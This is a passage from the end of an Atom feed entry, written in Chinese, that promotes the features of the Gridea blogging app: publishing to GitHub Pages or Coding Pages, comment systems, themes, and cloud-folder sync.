<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前 🏃</p>
<p>未来，它一定会成为你离不开的伙伴</p>
<p>尽情发挥你的才华吧！</p>
<p>😘 Enjoy~</p>
]]></content>
    </entry>
</feed>